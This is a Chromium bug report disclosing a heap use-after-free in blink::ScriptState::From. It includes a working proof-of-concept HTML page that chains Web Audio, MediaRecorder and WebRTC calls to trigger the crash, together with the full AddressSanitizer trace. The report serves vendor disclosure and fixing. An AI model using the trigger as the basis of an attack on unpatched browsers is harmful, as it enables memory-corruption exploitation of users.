VULNERABILITY DETAILS
	Steps to reproduce:
	
	1.Open PoC UAF_ScriptStateFrom.html in Chrome browser ASAN build.
	2.ASAN reports a Use After Free in blink::ScriptState::From. (If it hits a NULL pointer deference, just refresh it)

		=================================================================
		==9112==ERROR: AddressSanitizer: heap-use-after-free on address 0x6d0df041 at pc 0x1665c027 bp 0x00cfad7c sp 0x00cfad70
		READ of size 4 at 0x6d0df041 thread T0
			#0 0x1665c026 in blink::ScriptState::From C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\bindings\ScriptState.h:129


VERSION

	Chrome Version: Chromium	63.0.3218.0 (Developer Build) (32-bit) 
	Operating System: Windows 10 

REPRODUCTION CASE  (UAF_ScriptStateFrom.html)

	<html><audio id="myAudio"></audio><script>
	setTimeout(function(){location.reload()},152);
	var offlineCtx = new OfflineAudioContext(27,1336353,23703);
	var context = new AudioContext();
	var streamDestNode  = context.createMediaStreamDestination();
	var mediaRecorder= new MediaRecorder(streamDestNode.stream);
	offlineCtx.oncomplete = function() {mediaRecorder.stop();pc0.close();}
	mediaRecorder.start();
	var rtcConfig = { "iceServers": [{ "urls": "stun:stun2.l.google.com:19302" },  ] };
	var options = {optional:[{DtlsSrtpKeyAgreement:true}, {RtpDataChannels: true}]};
	var pc0 = new RTCPeerConnection(rtcConfig,options);
	pc0.createOffer(function(offer) {offlineCtx.startRendering().then(function() {});}, function(){});
	var txDataChan = pc0.createDataChannel("DataChanName1");
	setInterval(function(){pc0.createOffer(function(offer) {}, function(e) {mediaRecorder.resume();});}, 30);
	var a = document.getElementById("myAudio");
	</script></html>


FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION

Type of crash: tab
Crash State: 

	=================================================================
	==9112==ERROR: AddressSanitizer: heap-use-after-free on address 0x6d0df041 at pc 0x1665c027 bp 0x00cfad7c sp 0x00cfad70
	READ of size 4 at 0x6d0df041 thread T0
		#0 0x1665c026 in blink::ScriptState::From C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\bindings\ScriptState.h:129
		#1 0x16765e18 in blink::V8PerContextData::From C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\bindings\V8PerContextData.cpp:73
		#2 0x166ca30a in blink::V8DOMWrapper::CreateWrapper C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\bindings\V8DOMWrapper.cpp:53
		#3 0x1665ac32 in blink::ScriptWrappable::Wrap C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\bindings\ScriptWrappable.cpp:29
		#4 0x1a7e74ed in blink::V8Document::getElementByIdMethodCallbackForMainWorld C:\b\c\b\win_asan_release\src\out\release\gen\blink\bindings\core\v8\V8Document.cpp:6580
		#5 0x10d1b9cd in v8::internal::FunctionCallbackArguments::Call C:\b\c\b\win_asan_release\src\v8\src\api-arguments.cc:25
		#6 0x10f66e07 in v8::internal::`anonymous namespace'::HandleApiCallHelper<0> C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:112
		#7 0x10f63c31 in v8::internal::Builtin_Impl_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:142
		#8 0x10f630c1 in v8::internal::Builtin_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:130

	0x6d0df041 is located 2283585 bytes inside of 5345412-byte region [0x6ceb1800,0x6d3ca884)
	freed by thread T0 here:
		#0 0x15b75f8 in free e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:44
		#1 0x1995a50e in WTF::ArrayBufferContents::DataHandle::~DataHandle C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\wtf\typed_arrays\ArrayBufferContents.h:99
		#2 0x1995b005 in WTF::ThreadSafeRefCounted<WTF::ArrayBufferContents::DataHolder>::Deref C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\wtf\ThreadSafeRefCounted.h:63
		#3 0x16b83f78 in WTF::RefCounted<WTF::ArrayBuffer>::Deref C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\wtf\RefCounted.h:149
		#4 0x1995bb7b in WTF::ArrayBufferView::~ArrayBufferView C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\wtf\typed_arrays\ArrayBufferView.cpp:48
		#5 0x179d6714 in WTF::Uint16Array::~Uint16Array C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\wtf\typed_arrays\Int8Array.h:36
		#6 0x179d5b16 in blink::DOMArrayBufferView::~DOMArrayBufferView C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\typed_arrays\DOMArrayBufferView.h:35
		#7 0x179d5a9e in blink::DOMTypedArray<WTF::Float32Array,v8::Float32Array>::~DOMTypedArray C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\typed_arrays\DOMTypedArray.h:89
		#8 0x1ade8a61 in blink::FinalizerTrait<blink::Iterator>::Finalize C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\heap\GCInfo.h:61
		#9 0x12bec7fe in blink::HeapObjectHeader::Finalize C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\heap\HeapPage.cpp:100
		#10 0x12bf4d0b in blink::NormalPage::Sweep C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\heap\HeapPage.cpp:1343
		#11 0x12bee643 in blink::BaseArena::SweepUnsweptPage C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\heap\HeapPage.cpp:282
		#12 0x12beea7e in blink::BaseArena::LazySweepWithDeadline C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\heap\HeapPage.cpp:311
		#13 0x12c01bc0 in blink::ThreadState::PerformIdleLazySweep C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\heap\ThreadState.cpp:642
		#14 0x12c0abc2 in base::internal::Invoker<base::internal::BindState<void (blink::ThreadState::*)(double) __attribute__((thiscall)),WTF::UnretainedWrapper<blink::ThreadState,WTF::FunctionThreadAffinity::kSameThreadAffinity> >,void (double)>::Run C:\b\c\b\win_asan_release\src\base\bind_internal.h:331
		#15 0x165ff365 in blink::`anonymous namespace'::IdleTaskRunner::Run C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\WebScheduler.cpp:26
		#16 0x12cf02ac in blink::scheduler::WebSchedulerImpl::RunIdleTask C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\scheduler\child\web_scheduler_impl.cc:45
		#17 0x12cf0aeb in base::internal::FunctorTraits<void (*)(std::unique_ptr<blink::WebThread::IdleTask,std::default_delete<blink::WebThread::IdleTask> >, base::TimeTicks),void>::Invoke<std::unique_ptr<blink::WebThread::IdleTask,std::default_delete<blink::WebThread::IdleTask> >,base::TimeTicks> C:\b\c\b\win_asan_release\src\base\bind_internal.h:149
		#18 0x12cf092f in base::internal::Invoker<base::internal::BindState<void (*)(std::unique_ptr<blink::WebThread::IdleTask,std::default_delete<blink::WebThread::IdleTask> >, base::TimeTicks),base::internal::PassedWrapper<std::unique_ptr<blink::WebThread::IdleTask,std::default_delete<blink::WebThread::IdleTask> > > >,void (base::TimeTicks)>::Run C:\b\c\b\win_asan_release\src\base\bind_internal.h:324
		#19 0x12ceb62d in blink::scheduler::SingleThreadIdleTaskRunner::RunTask C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\scheduler\child\single_thread_idle_task_runner.cc:79
		#20 0x12cee79b in base::internal::FunctorTraits<void (blink::scheduler::SingleThreadIdleTaskRunner::*)(base::RepeatingCallback<void (base::TimeTicks)>) __attribute__((thiscall)),void>::Invoke<const base::WeakPtr<blink::scheduler::SingleThreadIdleTaskRunner> &,const base::RepeatingCallback<void (base::TimeTicks)> &> C:\b\c\b\win_asan_release\src\base\bind_internal.h:194
		#21 0x12cee5d0 in base::internal::Invoker<base::internal::BindState<void (blink::scheduler::SingleThreadIdleTaskRunner::*)(base::RepeatingCallback<void (base::TimeTicks)>) __attribute__((thiscall)),base::WeakPtr<blink::scheduler::SingleThreadIdleTaskRunner>,base::RepeatingCallback<void (base::TimeTicks)> >,void ()>::Run C:\b\c\b\win_asan_release\src\base\bind_internal.h:324
		#22 0x133d692c in base::debug::TaskAnnotator::RunTask C:\b\c\b\win_asan_release\src\base\debug\task_annotator.cc:55
		#23 0x12cc6d99 in blink::scheduler::TaskQueueManager::ProcessTaskFromWorkQueue C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\scheduler\base\task_queue_manager.cc:515
		#24 0x12cc28f9 in blink::scheduler::TaskQueueManager::DoWork C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\scheduler\base\task_queue_manager.cc:312
		#25 0x182a3acc in base::internal::Invoker<base::internal::BindState<void (content::WebMediaPlayerMS::*)(bool) __attribute__((thiscall)),base::WeakPtr<content::WebMediaPlayerMS>,bool>,void ()>::RunOnce C:\b\c\b\win_asan_release\src\base\bind_internal.h:319
		#26 0x133d692c in base::debug::TaskAnnotator::RunTask C:\b\c\b\win_asan_release\src\base\debug\task_annotator.cc:55
		#27 0x1345b742 in base::internal::IncomingTaskQueue::RunTask C:\b\c\b\win_asan_release\src\base\message_loop\incoming_task_queue.cc:147
		#28 0x13305075 in base::MessageLoop::RunTask C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:406

	previously allocated by thread T0 here:
		#0 0x15b76dc in malloc e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:60
		#1 0x199598cf in WTF::ArrayBufferContents::DataHolder::AllocateNew C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\wtf\typed_arrays\ArrayBufferContents.cpp:203
		#2 0x19959792 in WTF::ArrayBufferContents::ArrayBufferContents C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\wtf\typed_arrays\ArrayBufferContents.cpp:72
		#3 0x16f94687 in WTF::ArrayBuffer::CreateOrNull C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\wtf\typed_arrays\ArrayBuffer.h:179
		#4 0x1d05fb4b in WTF::TypedArrayBase<float>::CreateUninitializedOrNull<WTF::Float32Array> C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\wtf\typed_arrays\TypedArrayBase.h:104
		#5 0x1d05cfa0 in blink::AudioBuffer::CreateFloat32ArrayOrNull C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\modules\webaudio\AudioBuffer.cpp:168
		#6 0x1d059949 in blink::AudioBuffer::AudioBuffer C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\modules\webaudio\AudioBuffer.cpp:190
		#7 0x1d05c771 in blink::AudioBuffer::CreateUninitialized C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\modules\webaudio\AudioBuffer.cpp:121
		#8 0x1d087204 in blink::OfflineAudioContext::startOfflineRendering C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\modules\webaudio\OfflineAudioContext.cpp:202
		#9 0x1cae01e9 in blink::V8OfflineAudioContext::startRenderingMethodCallback C:\b\c\b\win_asan_release\src\out\release\gen\blink\bindings\modules\v8\V8OfflineAudioContext.cpp:259
		#10 0x10d1b9cd in v8::internal::FunctionCallbackArguments::Call C:\b\c\b\win_asan_release\src\v8\src\api-arguments.cc:25
		#11 0x10f66e07 in v8::internal::`anonymous namespace'::HandleApiCallHelper<0> C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:112
		#12 0x10f63c31 in v8::internal::Builtin_Impl_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:142
		#13 0x10f630c1 in v8::internal::Builtin_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:130

	SUMMARY: AddressSanitizer: heap-use-after-free C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\bindings\ScriptState.h:129 in blink::ScriptState::From
	Shadow bytes around the buggy address:
	  0x3da1bdb0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
	  0x3da1bdc0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
	  0x3da1bdd0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
	  0x3da1bde0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
	  0x3da1bdf0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
	=>0x3da1be00: fd fd fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd
	  0x3da1be10: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
	  0x3da1be20: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
	  0x3da1be30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
	  0x3da1be40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
	  0x3da1be50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
	Shadow byte legend (one shadow byte represents 8 application bytes):
	  Addressable:           00
	  Partially addressable: 01 02 03 04 05 06 07 
	  Heap left redzone:       fa
	  Freed heap region:       fd
	  Stack left redzone:      f1
	  Stack mid redzone:       f2
	  Stack right redzone:     f3
	  Stack after return:      f5
	  Stack use after scope:   f8
	  Global redzone:          f9
	  Global init order:       f6
	  Poisoned by user:        f7
	  Container overflow:      fc
	  Array cookie:            ac
	  Intra object redzone:    bb
	  ASan internal:           fe
	  Left alloca redzone:     ca
	  Right alloca redzone:    cb
	==9112==ABORTING


